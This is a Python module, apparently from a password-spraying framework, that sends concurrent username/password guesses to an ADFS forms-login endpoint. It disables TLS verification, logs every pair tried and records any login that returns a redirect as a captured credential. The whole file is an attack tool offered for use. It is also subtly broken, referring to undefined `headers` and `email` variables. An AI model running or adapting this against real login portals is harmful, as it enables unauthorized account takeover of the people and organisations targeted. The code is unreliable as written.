#!/usr/bin/env python3

import json
import time
import logging
import urllib3
import asyncio
import requests
import concurrent.futures
import concurrent.futures.thread
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from functools import partial
from core.utils import *
from core.defaults import *
from requests.auth import HTTPBasicAuth

class ASModule(object):

    # Storage for successful results of each task
    successful_results = []

    def __init__(self, *args, **kwargs):
        self.args     = kwargs['args']
        self.loop     = kwargs['loop']
        self.out_dir  = kwargs['out_dir']
        self.executor = concurrent.futures.ThreadPoolExecutor(
            max_workers=self.args.rate
        )
        self.proxies  = None if not self.args.proxy else {
            "http": self.args.proxy, "https": self.args.proxy
        }
        # Open file handles for logging and writing test cases
        self.log_file    = ThreadWriter(LOG_FILE, kwargs['log_dir'])
        self.tested_file = ThreadWriter("tested.txt", kwargs['log_dir'])
        # Globally track users being sprayed so we can remove users
        # as needed
        self.users = []

    def shutdown(self, key=False):
        ''' Perform a shutdown and clean up of the asynchronous handler '''
        print()  # Print empty line
        if key:
            logging.warning("CTRL-C caught...")
        logging.info(f"Writing results to: '{self.out_dir}'")

        # https://stackoverflow.com/a/48351410
        # https://gist.github.com/yeraydiazdiaz/b8c059c6dcfaf3255c65806de39175a7
        # Unregister _python_exit while using asyncio
        # Shutdown ThreadPoolExecutor and do not wait for current work
        import atexit
        atexit.unregister(concurrent.futures.thread._python_exit)
        self.executor.shutdown = lambda wait:None

        # Write the successful results
        with open(f"{self.out_dir}{SPRAY_FILE}", 'a') as f:
            write_data(self.successful_results, f)

        # Close the open file handles
        self.log_file.close()
        self.tested_file.close()

    async def run(self, password):
        ''' Asyncronously execute task(s) '''
        blocking_tasks = [
            self.loop.run_in_executor(
                self.executor, partial(self._execute,
                                       user=user,
                                       password=password)
            )
            for user in self.users
        ]
        if blocking_tasks:
            await asyncio.wait(blocking_tasks)

    def _execute(self, user, password):
        ''' Perform an asynchronous task '''
        try:
            time.sleep(0.250)

            # --------------------------------------------------------
            # For new modules, modify the below code block logic

            # Via: https://github.com/0xZDH/o365spray/blob/master/core/handlers/sprayer.py#L298
            ''' Spray users via a managed ADFS server
                https://github.com/Mr-Un1k0d3r/RedTeamScripts/blob/master/adfs-spray.py '''

            custom_headers = HTTP_HEADERS

            # Build/validate email
            if self.args.domain:
                user = build_email(user, self.args.domain)

            elif not check_email(user):
                logging.error(f"Invalid user: {user}")
                return

            # Keep track of tested names in case we ctrl-c
            self.tested_file.write(f"{user}:{password}")

            # TODO: `url` needs to be filled in by the user as each ADGS instance is unique
            url      = self.args.url
            data     = f"UserName={user}&Password={password}&AuthMethod=FormsAuthentication"

            response = self._send_request(requests.post,
                                          url,
                                          data=data,
                                          headers=headers)

            r_status = response.status_code

            if r_status == 302:
                self.successful_results.append(f"{user}:{password}")
                logging.info(f"{text_colors.green}[ + ]{text_colors.reset} {email}:{password}")
                self.users.remove(user)

            else:
                print(f"{text_colors.red}[ - ]{text_colors.reset} {email}:{password}{gen_space(user)}", end='\r')

            # End template module code block logic.
            # --------------------------------------------------------

        except Exception as e:
            logging.debug(e)
            pass

    def _send_request(self, request, url, auth=None, data=None,
                      json_data=None, headers=HTTP_HEADERS):
        ''' Template for HTTP Requests '''
        return request(url,
                       auth=auth,
                       data=data,
                       json=json_data,
                       headers=headers,
                       proxies=self.proxies,
                       timeout=self.args.timeout,
                       allow_redirects=False,
                       verify=False)
